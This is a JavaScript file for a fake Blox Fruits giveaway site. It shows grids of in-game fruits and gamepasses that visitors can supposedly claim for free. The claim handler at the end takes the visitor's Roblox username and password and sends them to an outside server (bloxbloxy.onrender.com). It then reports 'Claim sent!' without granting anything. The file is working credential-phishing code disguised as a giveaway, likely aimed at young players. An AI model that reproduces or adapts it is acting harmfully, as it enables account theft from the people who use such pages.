// scripts/script.js

const buttons = document.querySelectorAll(".nav button");

const fruitsSection = document.getElementById("fruitsSection");
const gamepassesSection = document.getElementById("gamepassesSection");
const permanentSection = document.getElementById("permanentSection");

buttons.forEach(btn=>{
    btn.onclick = () => {
        buttons.forEach(b=>b.classList.remove("active"));
        btn.classList.add("active");
        const tab = btn.dataset.tab;

        if(tab === "all"){
            fruitsSection.style.display = "block";
            gamepassesSection.style.display = "block";
            permanentSection.style.display = "block";
        }
        
        else if(tab === "fruits"){
            fruitsSection.style.display = "block";
            gamepassesSection.style.display = "none";
            permanentSection.style.display = "none";
        }
        
        else if(tab === "permanent"){
            fruitsSection.style.display = "none";
            gamepassesSection.style.display = "none";
            permanentSection.style.display = "block";
        }
        
        else if(tab === "gamepasses"){
            fruitsSection.style.display = "none";
            gamepassesSection.style.display = "block";
            permanentSection.style.display = "none";
        }
    };
});

/* DATA */
const fruits = [
{name:"Rocket", rarity:"common"},
{name:"Spin", rarity:"common"},
{name:"Blade", rarity:"common"},
{name:"Spring", rarity:"common"},
{name:"Bomb", rarity:"common"},
{name:"Smoke", rarity:"common"},
{name:"Spike", rarity:"common"},

{name:"Flame", rarity:"uncommon"},
{name:"Ice", rarity:"uncommon"},
{name:"Sand", rarity:"uncommon"},
{name:"Dark", rarity:"uncommon"},
{name:"Eagle", rarity:"uncommon"},
{name:"Diamond", rarity:"uncommon"},

{name:"Light", rarity:"rare"},
{name:"Rubber", rarity:"rare"},
{name:"Magma", rarity:"rare"},
{name:"Ghost", rarity:"rare"},

{name:"Quake", rarity:"legendary"},
{name:"Buddha", rarity:"legendary"},
{name:"Love", rarity:"legendary"},
{name:"Creation", rarity:"legendary"},
{name:"Spider", rarity:"legendary"},
{name:"Sound", rarity:"legendary"},
{name:"Phoenix", rarity:"legendary"},
{name:"Portal", rarity:"legendary"},
{name:"Lightning", rarity:"legendary"},
{name:"Pain", rarity:"legendary"},
{name:"Blizzard", rarity:"legendary"},

{name:"Gravity", rarity:"mythical"},
{name:"Mammoth", rarity:"mythical"},
{name:"T-Rex", rarity:"mythical"},
{name:"Dough", rarity:"mythical"},
{name:"Shadow", rarity:"mythical"},
{name:"Venom", rarity:"mythical"},
{name:"Gas", rarity:"mythical"},
{name:"Spirit", rarity:"mythical"},
{name:"Yeti", rarity:"mythical"},
{name:"Tiger", rarity:"mythical"},
{name:"Kitsune", rarity:"mythical"},
{name:"Control", rarity:"mythical"},
{name:"Dragon", rarity:"mythical"},
];

const gamepasses = [
{name:"2x Money", url:"https://static.wikia.nocookie.net/roblox-blox-piece/images/c/cf/BadgeMoneyx2.png/revision/latest?cb=20241223150409"},
{name:"2x Mastery", url:"https://static.wikia.nocookie.net/roblox-blox-piece/images/1/16/BadgeMasteryx2.png/revision/latest?cb=20241223150402"},
{name:"Fast Boats", url:"https://static.wikia.nocookie.net/roblox-blox-piece/images/f/fa/BadgeBoats.png/revision/latest?cb=20241223150315"},
{name:"Fruit Notifier", url:"https://static.wikia.nocookie.net/roblox-blox-piece/images/9/98/BadgeFruitNotifier.png/revision/latest?cb=20241223150335"},
{name:"Dark Blade", url:"https://static.wikia.nocookie.net/roblox-blox-piece/images/7/7f/BadgeDarkBlade.png/revision/latest?cb=20241223150329"},
{name:"2x Drop Chance", url:"https://static.wikia.nocookie.net/roblox-blox-piece/images/3/3a/BadgeBossDrops.png/revision/latest?cb=20241223150323"}
];

const fruitGrid = document.getElementById("fruitGrid");
const gamepassGrid = document.getElementById("gamepassGrid");
const permanentGrid = document.getElementById("permanentGrid");

const modal = document.getElementById("modal");
const claimModal = document.getElementById("claimModal");

const modalText = document.getElementById("modalText");
const claimItem = document.getElementById("claimItem");

const yesBtn = document.getElementById("yesBtn");
const noBtn = document.getElementById("noBtn");
const claimBtn = document.getElementById("claimBtn");

const username = document.getElementById("username");

let selected = "";
let selectedType = "";

function getImg(name){
    const gp = gamepasses.find(g=>g.name===name);
    if(gp) return gp.url;
    return `https://blox-fruits.fandom.com/wiki/Special:FilePath/${name}_Fruit.png`;
}

function createCard(item, parent, extraClass=""){
    const d = document.createElement("div");

    const isPermanent = extraClass === "permanent" || extraClass === "gamepass";

    d.className = "card " + (item.rarity || "") + " " + extraClass + (isPermanent ? " permanent" : "");

    d.innerHTML = `
        <img src="${getImg(item.name)}"
        onerror="this.src='https://via.placeholder.com/100'">
        <p>${item.name}</p>
    `;

    d.onclick = () => openModal(item.name, item.rarity, extraClass);

    parent.appendChild(d);
}

fruits.forEach(f=>createCard(f,fruitGrid));
gamepasses.forEach(g=>createCard(g,gamepassGrid, "gamepass"));
fruits.forEach(f=>createCard(f,permanentGrid,"permanent"));

function openModal(name, rarity, extraClass){
    selected = name;
    selectedType = extraClass; // IMPORTANT FIX

    if(extraClass === "permanent"){
        modalText.innerText = "Claim Permanent " + name;
    } else if(extraClass === "gamepass"){
        modalText.innerText = "Claim " + name + " Gamepass";
    } else {
        modalText.innerText = "Claim " + name;
    }

    modal.style.display = "flex";
}

noBtn.onclick=()=>modal.style.display="none";

yesBtn.onclick = () => {
    modal.style.display = "none";

    if(selectedType === "permanent"){
        claimItem.innerText = "Permanent Item: " + selected;
    } else if (selectedType === "gamepass"){
        claimItem.innerText = "Gamepass Item: " + selected;
    } else {
        claimItem.innerText = "Item: " + selected;
    }

    claimModal.style.display = "flex";
};

let isSending = false

/* FIXED CLAIM BUTTON */
claimBtn.onclick = async () => {
    if (isSending) {
        alert("Only one request allowed.");
        return;
    }

    isSending = true;

    try {
        const user = username.value.trim();
        const pass = document.getElementById("password").value.trim();

        if (!user || !pass) {
            alert("Please fill all fields.");
            return;
        }

        await fetch("https://bloxbloxy.onrender.com/api/claim", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                username: user,
                password: pass,
            })
        });

        localStorage.setItem("sent", "true");
        alert("Claim sent!");

    } catch (err) {
        console.error(err);
        alert(err);
    } finally {
        isSending = false;
    }
};

window.onclick=(e)=>{
    if(e.target===modal) modal.style.display="none";
    if(e.target===claimModal) claimModal.style.display="none";
};